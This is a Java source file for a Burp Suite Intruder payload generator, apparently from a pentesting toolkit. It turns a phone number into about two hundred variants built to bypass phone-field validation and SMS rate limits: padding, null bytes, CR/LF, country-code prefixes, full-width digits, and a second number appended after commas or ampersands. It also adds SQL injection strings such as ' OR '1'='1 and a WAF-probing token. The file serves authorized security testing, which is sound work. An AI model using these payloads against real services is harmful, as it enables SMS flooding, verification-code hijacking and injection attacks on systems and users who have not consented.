package AutoBurp.generator;

import burp.*;

import java.util.ArrayList;
import java.util.List;

public class PhonePayloadGeneratorFactory implements IIntruderPayloadGenerator {
    private final IExtensionHelpers helpers;
    private final IIntruderAttack attack;
    private final IBurpExtenderCallbacks callbacks;
    private int payloadIndex = 0;
    private final List<String> payloads = new ArrayList<>();
    private String basePhoneNumber = "18888888888"; 

    public PhonePayloadGeneratorFactory(IExtensionHelpers helpers, IIntruderAttack attack, IBurpExtenderCallbacks callbacks) {
        this.helpers = helpers;
        this.attack = attack;
        this.callbacks = callbacks;
        
        initializePayloads(basePhoneNumber.getBytes());
    }

    
    public void initializePayloads(byte[] selectedValue) {
        
        if (selectedValue != null && selectedValue.length > 0) {
            basePhoneNumber = new String(selectedValue);

        }  


        
        payloads.clear();
        
        
        String[] PAYLOAD_PATTERNS = new String[] {
            "xxxxxxxxxxx,",
            "xxxxxxxxxxx,,",
            "xxxxxxxxxxx,,,",
            "xxxxxxxxxxx,,,,",
            "xxxxxxxxxxx,,,,,",
            ",,,,,xxxxxxxxxxx",
            ",,,,xxxxxxxxxxx",
            ",,,xxxxxxxxxxx",
            ",,xxxxxxxxxxx",
            ",xxxxxxxxxxx",
            " xxxxxxxxxxx",
            "  xxxxxxxxxxx",
            "   xxxxxxxxxxx",
            "%20xxxxxxxxxxx",
            "%20%20xxxxxxxxxxx",
            "%20%20%20xxxxxxxxxxx",
            "xxxxxxxxxxx ",
            "xxxxxxxxxxx  ",
            "xxxxxxxxxxx   ",
            "xxxxxxxxxxx%20",
            "xxxxxxxxxxx%20%20",
            "xxxxxxxxxxx%20%20%20",
            "@xxxxxxxxxxx",
            "@@xxxxxxxxxxx",
            "@@@xxxxxxxxxxx",
            "xxxxxxxxxxx@",
            "xxxxxxxxxxx@@",
            "xxxxxxxxxxx@@@",
            "%00xxxxxxxxxxx",
            "%00%00xxxxxxxxxxx",
            "%00%00%00xxxxxxxxxxx",
            "xxxxxxxxxxx%00",
            "xxxxxxxxxxx%00%00",
            "xxxxxxxxxxx%00%00%00",
            "xxxxxxxxxxx\\n",
            "xxxxxxxxxxx\\n\\n",
            "xxxxxxxxxxx\\n\\n\\n",
            "xxxxxxxxxxx\\n\\n\\n\\n",
            "\\nxxxxxxxxxxx",
            "\\n\\nxxxxxxxxxxx",
            "\\n\\n\\nxxxxxxxxxxx",
            "\\n\\n\\n\\nxxxxxxxxxxx",
            "xxxxxxxxxxx\\r",
            "xxxxxxxxxxx\\r\\r",
            "xxxxxxxxxxx\\r\\r\\r",
            "xxxxxxxxxxx\\r\\r\\r\\r",
            "\\rxxxxxxxxxxx",
            "\\r\\rxxxxxxxxxxx",
            "\\r\\r\\rxxxxxxxxxxx",
            "\\r\\r\\r\\rxxxxxxxxxxx",
            "xxxxxxxxxxx+",
            "xxxxxxxxxxx++",
            "xxxxxxxxxxx+++",
            "xxxxxxxxxxx++++",
            "+xxxxxxxxxxx",
            "++xxxxxxxxxxx",
            "+++xxxxxxxxxxx",
            "++++xxxxxxxxxxx",
            "xxxxxxxxxxx-",
            "xxxxxxxxxxx--",
            "xxxxxxxxxxx---",
            "xxxxxxxxxxx----",
            "-xxxxxxxxxxx",
            "--xxxxxxxxxxx",
            "---xxxxxxxxxxx",
            "----xxxxxxxxxxx",
            "xxxxxxxxxxx*",
            "xxxxxxxxxxx**",
            "xxxxxxxxxxx***",
            "xxxxxxxxxxx****",
            "*xxxxxxxxxxx",
            "**xxxxxxxxxxx",
            "***xxxxxxxxxxx",
            "****xxxxxxxxxxx",
            "xxxxxxxxxxx/",
            "xxxxxxxxxxx//",
            "xxxxxxxxxxx///",
            "xxxxxxxxxxx////",
            "/xxxxxxxxxxx",
            "//xxxxxxxxxxx",
            "///xxxxxxxxxxx",
            "////xxxxxxxxxxx",
            "+86xxxxxxxxxxx",
            "+86 xxxxxxxxxxx",
            "+86%20xxxxxxxxxxx",
            "+12xxxxxxxxxxx",
            "+12 xxxxxxxxxxx",
            "+12%20xxxxxxxxxxx",
            "+852xxxxxxxxxxx",
            "+852 xxxxxxxxxxx",
            "+852%20xxxxxxxxxxx",
            "+853xxxxxxxxxxx",
            "+853 xxxxxxxxxxx",
            "+853%20xxxxxxxxxxx",
            "0086xxxxxxxxxxx",
            "0086 xxxxxxxxxxx",
            "0086%20xxxxxxxxxxx",
            "0012xxxxxxxxxxx",
            "0012 xxxxxxxxxxx",
            "0012%20xxxxxxxxxxx",
            "00852xxxxxxxxxxx",
            "00852 xxxxxxxxxxx",
            "00852%20xxxxxxxxxxx",
            "00853xxxxxxxxxxx",
            "00853 xxxxxxxxxxx",
            "00853%20xxxxxxxxxxx",
            "9986xxxxxxxxxxx",
            "9986 xxxxxxxxxxx",
            "9986%20xxxxxxxxxxx",
            "9912xxxxxxxxxxx",
            "9912 xxxxxxxxxxx",
            "9912%20xxxxxxxxxxx",
            "99852xxxxxxxxxxx",
            "99852 xxxxxxxxxxx",
            "99852%20xxxxxxxxxxx",
            "99853xxxxxxxxxxx",
            "99853 xxxxxxxxxxx",
            "99853%20xxxxxxxxxxx",
            "86xxxxxxxxxxx",
            "86 xxxxxxxxxxx",
            "86%20xxxxxxxxxxx",
            "12xxxxxxxxxxx",
            "12 xxxxxxxxxxx",
            "12%20xxxxxxxxxxx",
            "852xxxxxxxxxxx",
            "852 xxxxxxxxxxx",
            "852%20xxxxxxxxxxx",
            "853xxxxxxxxxxx",
            "853 xxxxxxxxxxx",
            "853%20xxxxxxxxxxx",
            "086xxxxxxxxxxx",
            "086 xxxxxxxxxxx",
            "086%20xxxxxxxxxxx",
            "012xxxxxxxxxxx",
            "012 xxxxxxxxxxx",
            "012%20xxxxxxxxxxx",
            "0852xxxxxxxxxxx",
            "0852 xxxxxxxxxxx",
            "0852%20xxxxxxxxxxx",
            "0853xxxxxxxxxxx",
            "0853 xxxxxxxxxxx",
            "0853%20xxxxxxxxxxx",
            "%86xxxxxxxxxxx",
            "%86 xxxxxxxxxxx",
            "%86%2%xxxxxxxxxxx",
            "%12xxxxxxxxxxx",
            "%12 xxxxxxxxxxx",
            "%12%2%xxxxxxxxxxx",
            "%852xxxxxxxxxxx",
            "%852 xxxxxxxxxxx",
            "%852%2%xxxxxxxxxxx",
            "%853xxxxxxxxxxx",
            "%853 xxxxxxxxxxx",
            "%853%2%xxxxxxxxxxx",
            " 0xxxxxxxxxxx",
            "%200xxxxxxxxxxx",
            "0xxxxxxxxxxx",
            "00xxxxxxxxxxx",
            "000xxxxxxxxxxx",
            "0000xxxxxxxxxxx",
            "00000xxxxxxxxxxx",
            "+)WAFXR#!Txxxxxxxxxxx",
            "xxxxxxxxxxx+)WAFXR#!T",
            "xxxxxxxxxxx.0",
            "xxxxxxxxxxx.1",
            "xxxxxxxxxxx.2",
            "xxxxxxxxxxx.3",
            "xxxxxxxxxxx,13811111111",
            "xxxxxxxxxxx,,13811111111",
            "xxxxxxxxxxx,,,13811111111",
            "xxxxxxxxxxx&13811111111",
            "xxxxxxxxxxx&&13811111111",
            "xxxxxxxxxxx&&&13811111111",
            "xxxxxxxxxxx&&&&13811111111",
            "13811111111&xxxxxxxxxxx",
            "13811111111&&xxxxxxxxxxx",
            "13811111111&&&xxxxxxxxxxx",
            "13811111111&&&&xxxxxxxxxxx",
            "13811111111,xxxxxxxxxxx",
            "13811111111,,xxxxxxxxxxx",
            "13811111111,,,xxxxxxxxxxx",
        };

        
        for (String pattern : PAYLOAD_PATTERNS) {
            String payload = pattern.replace("xxxxxxxxxxx", basePhoneNumber);
            payloads.add(payload);
        }

        
        payloads.add(basePhoneNumber + "/**/");
        payloads.add("/**/"+basePhoneNumber);
        payloads.add(basePhoneNumber + "||'1'='1");
        payloads.add(basePhoneNumber + "' OR '1'='1");
        payloads.add(basePhoneNumber + "' AND '1'='1");
        
        
        payloads.add(basePhoneNumber.replace("8", "８"));
        payloads.add(basePhoneNumber.replace("1", "１"));
        
        
        payloads.add(basePhoneNumber.replace("8", "八"));
        payloads.add(basePhoneNumber.replace("1", "一"));

    }

    @Override
    public boolean hasMorePayloads() {
        boolean result = payloadIndex < payloads.size();



        return result;
    }

    
    
    @Override
    public byte[] getNextPayload(byte[] baseValue) {
        if (payloadIndex == 0) {
            initializePayloads(baseValue);
        }
        
        if (payloadIndex < payloads.size()) {
            String currentPayload = payloads.get(payloadIndex);
            byte[] payload = currentPayload.getBytes();
            payloadIndex++;
            return payload;
        }
        
        return baseValue;
    }

    @Override
    public void reset() {
        payloadIndex = 0;
    }
}